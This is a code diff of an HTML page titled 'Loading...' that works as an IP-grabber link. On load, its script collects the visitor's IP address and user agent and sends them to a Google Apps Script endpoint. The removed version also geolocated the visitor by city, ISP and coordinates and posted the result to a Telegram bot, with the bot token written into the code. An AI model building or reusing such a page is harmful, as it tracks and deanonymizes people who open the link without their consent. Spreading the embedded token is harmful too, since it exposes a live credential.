@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,49 +8,18 @@
 <body>
     <h1>Loading...</h1>
     <script>
-        // IP लिने
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
-
-                // Location लिने (ip-api.com)
-                fetch('http://ip-api.com/json/' + ip + '?fields=status,country,city,isp,lat,lon')
-                    .then(res => res.json())
-                    .then(locData => {
-                        let location = 'Location नआएको';
-                        let mapLink = '';
-                        if (locData.status === 'success') {
-                            location = locData.country + ', ' + locData.city + ' (' + locData.isp + ')';
-                            mapLink = 'https://www.google.com/maps?q=' + locData.lat + ',' + locData.lon;
-                        }
-
-                        // Telegram मा पठाउने (सिधै Bot API)
-                        const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
-                        const chatId = '8621764137';
-                        const msg = '📥 नयाँ क्लिक!\nIP: ' + ip + 
-                                    '\n📍 Location: ' + location + 
-                                    (mapLink ? '\n🗺️ Maps: ' + mapLink : '') + 
-                                    '\nUA: ' + ua;
-
-                        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: msg
-                            })
-                        })
-                        .then(() => {
-                            document.body.innerHTML = '<h2>✅ Logged</h2><p>Your IP: ' + ip + '</p><p>📍 ' + location + '</p>' + (mapLink ? '<p>🗺️ <a href="' + mapLink + '" target="_blank">Google Maps</a></p>' : '');
-                        })
-                        .catch(() => {
-                            document.body.innerHTML = '<h2>❌ Failed to log</h2><p>IP: ' + ip + '</p>';
-                        });
+                const url = 'https://script.google.com/macros/s/AKfycbyJwfkqB7vGxuNxaQqEub5vNm4WtGzmhPdb5i779HX_oSh46maHtUge4sXkG5k0z1_oFQ/exec?ip=' + encodeURIComponent(ip) + '&ua=' + encodeURIComponent(ua);
+                fetch(url)
+                    .then(() => {
+                        document.body.innerHTML = '<h2>✅ Logged</h2><p>Your IP: ' + ip + '</p>';
                     })
                     .catch(() => {
-                        document.body.innerHTML = '<h2>❌ Location fetch गर्न सकिएन</h2><p>IP: ' + ip + '</p>';
+                        document.body.innerHTML = '<h2>❌ Failed to log</h2><p>IP: ' + ip + '</p>';
                     });
             })
             .catch(() => {
